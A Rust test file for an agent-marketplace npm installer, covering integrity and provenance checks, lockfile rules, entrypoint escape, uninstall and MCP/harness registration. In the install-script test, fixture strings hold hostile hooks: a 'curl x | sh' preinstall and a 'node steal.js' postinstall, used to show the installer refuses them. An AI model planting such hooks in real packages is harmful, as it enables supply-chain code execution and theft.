//! MK1 Task 6: installers. The npm cases use a real tarball with real
//! provenance (testdata/npm), so integrity and provenance are the production
//! checks; npm itself is replaced by a fake that lays out node_modules.
#![allow(clippy::unwrap_used)]

use std::path::Path;
use std::sync::Mutex;

use loams_agentd_marketplace::SigstoreVerifier;
use loams_agentd_marketplace::install::{
    self, Context, HarnessRegistration, InstallError, Layout, McpRegistration, Npm,
};
use loams_agentd_marketplace::provenance::ProvenanceError;
use serde_json::{Value, json};

fn read(name: &str) -> Vec<u8> {
    std::fs::read(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("testdata/npm")
            .join(name),
    )
    .unwrap()
}

fn integrity() -> String {
    String::from_utf8(read("sigstore-3.1.0.integrity"))
        .unwrap()
        .trim()
        .to_owned()
}

/// An agent listing for the real sigstore@3.1.0 tarball.
fn listing() -> Value {
    json!({
        "id": "ostrium/sigstore-agent",
        "kind": "agent",
        "version": "3.1.0",
        "title": "Sigstore agent",
        "source": { "repository": "https://github.com/sigstore/sigstore-js", "commit": "0".repeat(40) },
        "artifact": { "type": "npm", "name": "sigstore", "version": "3.1.0", "integrity": integrity() },
        "provenance": { "type": "npm-slsa", "ref": "https://registry.npmjs.org/-/npm/v1/attestations/sigstore@3.1.0" },
        "runtime": { "kind": "node", "version": ">=22.13" },
        "entrypoint": "dist/index.js",
        "pricing": "free"
    })
}

/// Lays out node_modules as npm would, with what each test needs.
struct FakeNpm {
    files: Vec<(&'static str, String)>,
    calls: Mutex<u32>,
}

impl FakeNpm {
    fn new(files: Vec<(&'static str, String)>) -> Self {
        Self {
            files,
            calls: Mutex::new(0),
        }
    }
    fn clean() -> Self {
        Self::new(vec![
            (
                "node_modules/sigstore/package.json",
                r#"{"name":"sigstore","version":"3.1.0"}"#.into(),
            ),
            (
                "node_modules/sigstore/dist/index.js",
                "module.exports = {};".into(),
            ),
        ])
    }
}

impl Npm for FakeNpm {
    fn install(&self, tarball: &Path, prefix: &Path) -> Result<(), String> {
        assert!(tarball.is_file());
        *self.calls.lock().unwrap() += 1;
        for (path, text) in &self.files {
            let path = prefix.join(path);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, text).unwrap();
        }
        Ok(())
    }
}

fn context() -> Context {
    Context {
        source: "official".into(),
        plan_digest: "ab".repeat(32),
        now_ms: 1_800_000_000_000,
    }
}

fn install(
    layout: &Layout,
    listing: &Value,
    tarball: &[u8],
    npm: &FakeNpm,
) -> Result<install::Installed, InstallError> {
    let verifier = SigstoreVerifier::production().unwrap();
    install::install_node(
        layout,
        listing,
        tarball,
        &[read("sigstore-3.1.0.slsa.sigstore.json")],
        &verifier,
        npm,
        &context(),
    )
}

#[test]
fn a_verified_package_installs() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let record = install(
        &layout,
        &listing(),
        &read("sigstore-3.1.0.tgz"),
        &FakeNpm::clean(),
    )
    .unwrap();
    assert_eq!(record.version, "3.1.0");
    assert!(Path::new(&record.entry).is_file());
    assert!(
        record
            .entry
            .contains("ostrium/sigstore-agent/3.1.0/node_modules/sigstore/dist/index.js")
    );
    assert!(
        record
            .built_by
            .starts_with("https://github.com/sigstore/sigstore-js/")
    );
    assert_eq!(layout.installed("ostrium/sigstore-agent").unwrap(), record);
    assert_eq!(layout.list(), [record]);
    assert!(
        layout
            .data_dir("ostrium/sigstore-agent")
            .join("home")
            .is_dir()
    );
}

#[test]
fn integrity_mismatch_refused() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let npm = FakeNpm::clean();
    let mut tarball = read("sigstore-3.1.0.tgz");
    tarball[100] ^= 1;
    let error = install(&layout, &listing(), &tarball, &npm).unwrap_err();
    assert!(
        matches!(
            error,
            InstallError::Provenance(ProvenanceError::IntegrityMismatch { .. })
        ),
        "{error}"
    );
    assert_eq!(*npm.calls.lock().unwrap(), 0, "npm never ran");
    assert!(layout.list().is_empty());
}

#[test]
fn provenance_repo_mismatch_refused() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let npm = FakeNpm::clean();
    let mut listing = listing();
    listing["source"]["repository"] = "https://github.com/ostrium-labs/loams-mastra".into();
    let error = install(&layout, &listing, &read("sigstore-3.1.0.tgz"), &npm).unwrap_err();
    assert!(
        matches!(
            error,
            InstallError::Provenance(ProvenanceError::RepoMismatch { .. })
        ),
        "{error}"
    );
    assert_eq!(*npm.calls.lock().unwrap(), 0);
}

#[test]
fn install_scripts_refused() {
    for (path, text) in [
        (
            "node_modules/sigstore/package.json",
            r#"{"name":"sigstore","scripts":{"postinstall":"node steal.js"}}"#,
        ),
        (
            "node_modules/evil-dep/package.json",
            r#"{"name":"evil-dep","scripts":{"preinstall":"curl x | sh"}}"#,
        ),
        ("node_modules/native-dep/binding.gyp", "{}"),
        (
            "node_modules/sigstore/npm-shrinkwrap.json",
            r#"{"packages":{"node_modules/x":{"hasInstallScript":true}}}"#,
        ),
    ] {
        let dir = tempfile::tempdir().unwrap();
        let layout = Layout::new(dir.path().join("agents"));
        let mut files = FakeNpm::clean().files;
        files.retain(|(p, _)| *p != path);
        files.push((path, text.into()));
        let error = install(
            &layout,
            &listing(),
            &read("sigstore-3.1.0.tgz"),
            &FakeNpm::new(files),
        )
        .unwrap_err();
        assert!(
            matches!(error, InstallError::InstallScript { .. }),
            "{path}: {error}"
        );
        assert!(layout.list().is_empty(), "{path}");
        assert!(
            !layout
                .listing_dir("ostrium/sigstore-agent")
                .join(".tmp-3.1.0")
                .exists(),
            "the staging directory is removed"
        );
        assert!(
            !layout
                .version_dir("ostrium/sigstore-agent", "3.1.0")
                .exists()
        );
    }
}

#[test]
fn dependencies_need_a_shipped_lockfile() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let mut files = FakeNpm::clean().files;
    files[0].1 = r#"{"name":"sigstore","dependencies":{"left-pad":"1.3.0"}}"#.into();
    let error = install(
        &layout,
        &listing(),
        &read("sigstore-3.1.0.tgz"),
        &FakeNpm::new(files.clone()),
    )
    .unwrap_err();
    assert!(matches!(error, InstallError::NoLockfile(_)), "{error}");
    files.push((
        "node_modules/sigstore/npm-shrinkwrap.json",
        r#"{"lockfileVersion":3,"packages":{}}"#.into(),
    ));
    install(
        &layout,
        &listing(),
        &read("sigstore-3.1.0.tgz"),
        &FakeNpm::new(files),
    )
    .unwrap();
}

#[test]
fn a_missing_entrypoint_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let mut listing = listing();
    listing["entrypoint"] = "../../escape.js".into();
    assert!(matches!(
        install(
            &layout,
            &listing,
            &read("sigstore-3.1.0.tgz"),
            &FakeNpm::clean()
        ),
        Err(InstallError::NoEntrypoint(_))
    ));
}

#[test]
fn uninstall_keeps_data() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    install(
        &layout,
        &listing(),
        &read("sigstore-3.1.0.tgz"),
        &FakeNpm::clean(),
    )
    .unwrap();
    let notes = layout
        .data_dir("ostrium/sigstore-agent")
        .join("home/notes.db");
    std::fs::write(&notes, "the user's notes").unwrap();
    let removed = layout.uninstall("ostrium/sigstore-agent").unwrap();
    assert_eq!(removed.id, "ostrium/sigstore-agent");
    assert!(layout.installed("ostrium/sigstore-agent").is_none());
    assert!(
        !layout
            .version_dir("ostrium/sigstore-agent", "3.1.0")
            .exists()
    );
    assert_eq!(std::fs::read_to_string(&notes).unwrap(), "the user's notes");
    assert!(matches!(
        layout.uninstall("ostrium/sigstore-agent"),
        Err(InstallError::NotInstalled(_))
    ));
    // Installing again finds the data where it was.
    install(
        &layout,
        &listing(),
        &read("sigstore-3.1.0.tgz"),
        &FakeNpm::clean(),
    )
    .unwrap();
    assert!(notes.is_file());
}

#[test]
fn npm_runs_with_scripts_off() {
    let args = install::npm_args(Path::new("/x/p.tgz"), Path::new("/x"));
    assert!(args.contains(&"--ignore-scripts".to_owned()));
    assert!(args.contains(&"--omit=dev".to_owned()));
}

#[test]
fn harness_descriptor_registration() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let mut listing = listing();
    listing["kind"] = "harness".into();
    listing["harness"] = json!({ "launch": { "protocol": "acp", "args": ["--acp"] }, "auth": ["api-key"], "models": ["m1"] });
    let record = install(
        &layout,
        &listing,
        &read("sigstore-3.1.0.tgz"),
        &FakeNpm::clean(),
    )
    .unwrap();
    let registration =
        install::harness_registration(&listing, &record, Path::new("/opt/node/bin/node")).unwrap();
    assert_eq!(
        registration,
        Some(HarnessRegistration {
            listing_id: "ostrium/sigstore-agent".into(),
            display_name: "Sigstore agent".into(),
            program: "/opt/node/bin/node".into(),
            args: vec![record.entry.clone(), "--acp".into()],
            models: vec!["m1".into()],
        })
    );
    // A native harness is agentd's own adapter: enabled, never registered.
    let native = json!({ "id": "ostrium/claude-code", "kind": "harness", "version": "1.0.0", "harness": { "launch": { "protocol": "native" }, "auth": ["cli-login"], "native_adapter": "claude-code" } });
    let record = install::install_without_artifact(&layout, &native, &context()).unwrap();
    assert_eq!(
        install::harness_registration(&native, &record, Path::new("node")).unwrap(),
        None
    );
}

#[test]
fn mcp_server_registrations() {
    let dir = tempfile::tempdir().unwrap();
    let layout = Layout::new(dir.path().join("agents"));
    let remote: Value = serde_json::from_slice(
        &std::fs::read(
            Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("../../schemas/marketplace/testdata/valid/mcp-server-remote.json"),
        )
        .unwrap(),
    )
    .unwrap();
    let record = install::install_without_artifact(&layout, &remote, &context()).unwrap();
    assert_eq!(
        install::mcp_registration(&remote, &record).unwrap(),
        McpRegistration::Remote {
            listing_id: "ostrium/plane-mcp-server".into(),
            url: "https://mcp.plane.so/http/api-key/mcp".into(),
            secret_inputs: vec!["api_key".into()],
        }
    );
    let local: Value = serde_json::from_slice(
        &std::fs::read(
            Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("../../schemas/marketplace/testdata/valid/mcp-server-local.json"),
        )
        .unwrap(),
    )
    .unwrap();
    let record = install::Installed {
        entry: "/data/agents/ostrium/github-mcp-server/2.0.3/github-mcp-server".into(),
        ..record
    };
    let McpRegistration::Local {
        command,
        args,
        secret_env,
        ..
    } = install::mcp_registration(&local, &record).unwrap()
    else {
        panic!("local");
    };
    assert_eq!(
        command,
        "/data/agents/ostrium/github-mcp-server/2.0.3/github-mcp-server"
    );
    assert_eq!(args, ["stdio"]);
    assert_eq!(
        secret_env,
        [(
            "GITHUB_PERSONAL_ACCESS_TOKEN".to_owned(),
            "token".to_owned()
        )]
    );
    // A listing with an artifact is not recorded without installing it.
    assert!(install::install_without_artifact(&layout, &local, &context()).is_err());
}
